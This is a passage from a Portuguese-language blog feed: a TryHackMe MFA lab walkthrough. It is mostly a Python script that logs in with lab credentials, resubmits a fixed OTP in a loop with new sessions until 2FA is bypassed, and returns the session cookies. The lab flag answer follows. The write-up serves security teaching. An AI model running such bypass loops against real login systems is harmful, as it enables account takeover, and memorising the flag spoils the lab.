+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dashboard_url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://mfa.thm/labs/third/dashboard&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Define login credentials&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;credentials &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;thm@mail.thm&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test123&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Define the headers to mimic a real browser&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;User-Agent&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Accept&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Accept-Language&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;en-US,en;q=0.5&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Accept-Encoding&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gzip, deflate&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Origin&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://mfa.thm&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connection&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;close&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Referer&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://mfa.thm/labs/third/mfa&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Upgrade-Insecure-Requests&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Function to check if the response contains the login page&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_login_successful&lt;/span&gt;(response):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;User Verification&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status_code &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Function to handle the login process&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;login&lt;/span&gt;(session):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(login_url, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;credentials, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Function to handle the 2FA process&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;submit_otp&lt;/span&gt;(session, otp):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Split the OTP into individual digits&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    otp_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;code-1&amp;#39;&lt;/span&gt;: otp[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;code-2&amp;#39;&lt;/span&gt;: otp[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;code-3&amp;#39;&lt;/span&gt;: otp[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;code-4&amp;#39;&lt;/span&gt;: otp[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(otp_url, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;otp_data, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers, allow_redirects&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# Disable auto redirects&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DEBUG: OTP submission response status code: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status_code&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; response
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Function to check if the response contains the login page&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_login_page&lt;/span&gt;(response):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sign in to your account&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Login&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Function to attempt login and submit the hardcoded OTP until success&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;try_until_success&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    otp_str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1337&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# Hardcoded OTP&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:  &lt;span style=&#34;color:#75715e&#34;&gt;# Keep trying until success&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        session &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Session()  &lt;span style=&#34;color:#75715e&#34;&gt;# Create a new session object for each attempt&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        login_response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; login(session)  &lt;span style=&#34;color:#75715e&#34;&gt;# Log in before each OTP attempt&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_login_successful(login_response):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Logged in successfully.&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed to log in.&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Trying OTP: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;otp_str&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; submit_otp(session, otp_str)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Check if the response is the login page (unsuccessful OTP)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_login_page(response):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Unsuccessful OTP attempt, redirected to login page. OTP: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;otp_str&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# Retry login and OTP submission&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Check if the response is a redirect (status code 302)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status_code &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;302&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            location_header &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;headers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Session cookies: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cookies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_dict()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;# Check if it successfully bypassed 2FA and landed on the dashboard&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; location_header &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/labs/third/dashboard&amp;#39;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Successfully bypassed 2FA with OTP: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;otp_str&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cookies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_dict()  &lt;span style=&#34;color:#75715e&#34;&gt;# Return session cookies after successful bypass&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; location_header &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/labs/third/&amp;#39;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed OTP attempt. Redirected to login. OTP: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;otp_str&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Unexpected redirect location: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;location_header&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;. OTP: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;otp_str&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Received status code &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status_code&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;. Retrying...&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Start the attack to try until success&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;try_until_success()&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;O script basicamente automatiza o processo de teste de PIN, para cada tentativa OTP uma nova sessão é criada, usando &lt;code&gt;requests.Session()&lt;/code&gt;, isso garante que a página é atualizada, será feito o login com as credenciais do usuário, e realizado uma nova tentativa para descobrir o OTP.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/MFA/shell-exploit.png&#34; alt=&#34;shell exploit&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Agora com nosso &lt;code&gt;cookie&lt;/code&gt; autenticado, iremos utiliza-lo no navegador.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/MFA/flag%20lab3.png&#34; alt=&#34;Flag lab 3&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the flag in the dashboard?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;20548e076dbb9ba30c9d94ae4aceb38e&lt;/code&gt;&lt;/p&gt;
+&lt;h1 data-hextra-search-id=&#34;conclusão&#34;&gt;Conclusão&lt;/h1&gt;&lt;p&gt;Nesta aula, obtivemos um entendimento mais claro sobre MFA e as diferenças entre MFA e 2FA. Abordamos os conceitos dos diferentes tipos de fatores de autenticação existentes e em quais cenários eles são normalmente utilizados. Além disso, foi apresentado, em aula prática, os tipos de vulnerabilidades comuns e as melhores práticas para mitigá-las.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+  </channel>
+</rss>
